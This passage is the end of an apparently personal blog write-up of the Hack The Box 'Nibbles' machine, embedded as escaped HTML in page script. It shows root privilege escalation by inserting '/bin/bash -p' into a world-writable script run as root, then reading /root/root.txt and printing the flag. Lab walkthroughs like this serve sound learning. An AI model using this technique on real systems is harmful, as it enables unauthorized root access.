id=\"vulnerability-explanation-1\"\u003E\u003Cstrong\u003EVulnerability Explanation:\u003C\u002Fstrong\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003EThe file \u003Cstrong\u003E\u002Fhome\u002Fnibbler\u002Fpersonal\u002Fstuff\u002Fmonitor.sh\u003C\u002Fstrong\u003E is world-writable. The content of the file can be modified to drop a shell. When running the file as root, the attacker will be get a root shell.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003E# line in added at the top of the script, just after the shebang line.\n\u002Fbin\u002Fbash -p \u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210427004934185.png\" alt=\"\"\u003E \u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210427005056993.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"roottxt\"\u003ERoot.txt\u003C\u002Fh3\u003E\n\u003Cp\u003Ethe \u003Cstrong\u003Eroot.txt\u003C\u002Fstrong\u003E file is always located in \u003Cstrong\u003E\u002Froot\u002F\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ecat \u002Froot\u002Froot.txt\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"Nibbles.assets\u002Fimage-20210427005421970.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cblockquote\u003E\n\u003Cp\u003Eroot.txt flag: \u003Ccode\u003Ed9ae263a345701460f51766ae70e5e26\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\n\u003C\u002Fblockquote\u003E\n",date:"2021-04-27",excerpt:"",printDate:"April 27, 2021",printReadingTime:"5 min read"}}]};if('serviceWorker' in navigator)navigator.serviceWorker.register('/Blog/service-worker.js');(function(){try{eval("async function x(){}");var main="/Blog/client/client.92aecc44.js"}catch(e){main="/Blog/client/legacy/client.49c5bc27.js"};var s=document.createElement("script");try{new Function("if(0)import('')")();s.src=main;s.type="module";s.crossOrigin="use-credentials";}catch(e){s.src="/Blog/client/shimport@1.0.1.js";s.setAttribute("data-main",main);}document.head.appendChild(s);}());</script> 